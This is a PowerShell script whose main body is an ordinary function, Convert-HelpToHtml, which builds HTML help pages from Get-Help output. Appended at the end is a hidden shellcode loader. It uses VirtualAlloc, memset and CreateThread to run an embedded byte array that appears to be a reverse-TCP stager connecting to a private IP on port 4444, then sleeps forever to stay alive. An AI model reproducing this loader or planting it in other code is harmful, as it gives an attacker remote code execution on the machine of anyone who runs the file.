
function Convert-HelpToHtml 
{
    
	param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [string[]]
        
        $Name,

        [string]
        
        $DisplayName,

        [string[]]
        
        
        
        
        
        $Syntax,

        [string]
        
        $ModuleName,

        [string[]]
        
        $Script
    )

    begin
    {
        Set-StrictMode -Version 'Latest'
    }

    process
    {

        foreach( $commandName in $Name )
        {
            $html = New-Object 'Text.StringBuilder'

            $fullCommandName = $commandName
            if( (Get-Help -Name $commandName | Measure-Object).Count -gt 1 )
            {
                $fullCommandName = '{0}\{1}' -f $ModuleName,$commandName
            }
            Write-Verbose -Message $fullCommandName
            $help = Get-Help -Name $fullCommandName -Full

            if( -not $DisplayName )
            {
                $DisplayName = $commandName
                if( [IO.Path]::IsPathRooted($DisplayName) )
                {
                    $DisplayName = Split-Path -Leaf -Path $DisplayName
                }
            }
        
            [void]$html.AppendFormat( '<h1>{0}</h1>{1}', $DisplayName, [Environment]::NewLine )

            $synopsis = $help.Synopsis | Convert-MarkdownToHtml
            if( $synopsis )
            {
                [void]$html.AppendFormat( '<div class="Synopsis">{0}{1}{0}</div>{0}', [Environment]::NewLine, $synopsis )
            }

            if( -not $Syntax )
            {
                $help.Syntax |
                    ForEach-Object { $_.syntaxItem } |
                    Where-Object { [IO.Path]::IsPathRooted($_.name) } |
                    ForEach-Object { $_.Name = Split-Path -Leaf -Path $_.name }

                $Syntax = $help.Syntax | Out-HtmlString | Format-ForHtml | ForEach-Object { $_ -split "`n" }
            }

            if( $Syntax )
            {
                [void]$html.AppendLine( @"

<h2>Syntax</h2>
<pre class="Syntax"><code>{0}</code></pre>
"@ -f ($Syntax -join "</code></pre>$([Environment]::NewLine)<pre class=""Syntax""><code>") )
            }

            $description = $null
            if( $help | Get-Member -Name 'Description' )
            {    
                $description = $help.Description | Out-HtmlString | Convert-MarkdownToHtml
            }
            if( $description )
            {
                [void]$html.AppendLine( @"

<h2>Description</h2>
<div class="Description">
$description
</div>
"@ )
            }
    
            [string[]]$relatedCommands = $help | Convert-RelatedLinkToHtml -ModuleName $ModuleName -Script $Script
    
            if( $relatedCommands )
            {
                $relatedCommands = $relatedCommands | ForEach-Object { "<li>{0}</li>" -f $_ }
                [void]$html.AppendLine( @"

<h2>Related Commands</h2>

<ul class="RelatedCommands">
{0}
</ul>
"@ -f ($relatedCommands -join ([Environment]::NewLine)) )
            }
    
            $commonParameterNames = @{
                                        'Verbose' = $true;
                                        'Debug' = $true;
                                        'WarningAction' = $true;
                                        'WarningVariable' = $true;
                                        'ErrorAction' = $true;
                                        'ErrorVariable' = $true;
                                        'OutVariable' = $true;
                                        'OutBuffer' = $true;
                                        'WhatIf' = $true;
                                        'Confirm' = $true;
                                    }
            $hasCommonParameters = $false
            $parameters = $help | 
                            Select-Object -ExpandProperty 'Parameters' |
                            Where-Object { $_ | Get-Member -Name 'parameter' } |
                            Select-Object -ExpandProperty 'parameter' |
                            Where-Object { $_ } | 
                            ForEach-Object {
                                if( $commonParameterNames.ContainsKey( $_.name ) )
                                {
                                    $hasCommonParameters = $true
                                }
            
                                $defaultValue = '&nbsp;'
                                if( $_ | Get-Member -Name 'DefaultValue' )
                                {
                                    $defaultValue = $_.DefaultValue
                                }
                                $typeLink = Get-TypeDocumentationLink -CommandName $commandName -TypeName $_.type.name
                                $paramDescription = $_ | 
                                                        Where-Object { $_ | Get-Member -name 'Description' } |
                                                        Select-Object -ExpandProperty 'Description' |
                                                        Out-HtmlString | 
                                                        Convert-MarkdownToHtml
                            @"
<tr valign='top'>
	<td>{0}</td>
	<td>{1}</td>
	<td class="ParamDescription">{2}</td>
	<td>{3}</td>
	<td>{4}</td>
    <td>{5}</td>
</tr>
"@ -f $_.Name,$typeLink,$paramDescription,$_.Required,$_.PipelineInput,$defaultValue
                    }
        
            if( $parameters )
            {
                $commonParameters = ''
                if( $hasCommonParameters )
                {
                    $commonParameters = @"
<tr valign="top">
    <td><a href="http://technet.microsoft.com/en-us/library/dd315352.aspx">CommonParameters</a></td>
    <td></td>
    <td>This cmdlet supports common parameters.  For more information type <br> <code>Get-Help about_CommonParameters</code>.</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
"@
                }
                [void]$html.AppendLine( (@"

<h2> Parameters </h2>
<table id="Parameters">
<tr>
	<th>Name</th>
    <th>Type</th>
	<th>Description</th>
	<th>Required?</th>
	<th>Pipeline Input</th>
	<th>Default Value</th>
</tr>
{0}
{1}
</table>
"@ -f ($parameters -join [Environment]::NewLine),$commonParameters))
            }

            $inputTypes = @()
            if( ($help | Get-Member -Name 'inputTypes') -and ($help.inputTypes | Get-Member 'inputType') )
            {
                $inputTypes = $help.inputTypes.inputType |
                                    Where-Object {  ($_ | Get-Member -Name 'type') -and $_.type -and $_.type.name -match '^([^\s]+)\s*(.*)?$' } |
                                    ForEach-Object { 
                                        $typeLink = Get-TypeDocumentationLink -CommandName $commandName -TypeName $Matches[1].Trim('.')
                                        '{0}. {1}' -f $typeLink,$matches[2]
                                    } |
                                    Convert-MarkdownToHtml
            }

            if( $inputTypes )
            {
                [void]$html.AppendLine( @"

<h2>Input Types</h2>
<div class="InputTypes">
{0}
</div>
"@ -f ($inputTypes -join [Environment]::NewLine))
            }
    
            $returnValues =@()
            if( ($help | Get-Member -Name 'returnValues') -and ($help.returnValues | Get-Member -Name 'returnValue') )
            {
                $returnValues = $help.returnValues.returnValue |
                                    Where-Object {  ($_ | Get-Member -Name 'type') -and $_.type -and $_.type.name -match '^([^\s]+)\s*(.*)?$' } |
                                    ForEach-Object { 
                                        $typeLink = Get-TypeDocumentationLink -CommandName $commandName -TypeName $Matches[1].Trim('.')
                                        '{0}. {1}' -f $typeLink,$matches[2]
                                    } |
                                    Convert-MarkdownToHtml
            }

            if( $returnValues )
            {
                [void]$html.AppendLine( @"

<h2>Return Values</h2>
<div class="ReturnValues">
{0}
</div>
"@ -f ($returnValues -join [Environment]::NewLine))
            }
    
            $notes = ''
            if( $help | Get-Member -Name 'AlertSet' )
            {
                $notes = $help.AlertSet | Out-HtmlString | ForEach-Object { $_ -replace "\r?\n    ",[Environment]::NewLine } | Convert-MarkdownToHtml
            }

            if( $notes )
            {
                [void]$html.AppendLine( @"

<h2>Notes</h2>
<div class="Notes">
{0}
</div>
"@ -f $notes)
            }
    
            $examples = @()
            if( $help | Get-Member -Name 'Examples' )
            {
                $examples = $help.Examples |
                    Where-Object { $_ } |
                    Where-Object { $_ | Get-Member -Name 'example' } |
                    Select-Object -ExpandProperty 'example' |
                    ForEach-Object {
                        $title = $_.title.Trim(('-',' '))
                        $code = ''
                        if( $_.code )
                        {
                            $code = $_.code | Out-HtmlString
                            $code = '<pre><code>{0}</code></pre>' -f $code
                        }
                        $remarks = $_.remarks | Out-HtmlString | Convert-MarkdownToHtml
                        @"

<h2>{0}</h2>
{1}
{2}
"@ -f $title,$code,($remarks -join [Environment]::NewLine)
                }
            }

            if( $examples )
            {
                [void]$html.AppendLine( ($examples -join ([Environment]::NewLine * 2)) )
            }

            $html.ToString()
        }
    }

    end
    {
    }
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x2d,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

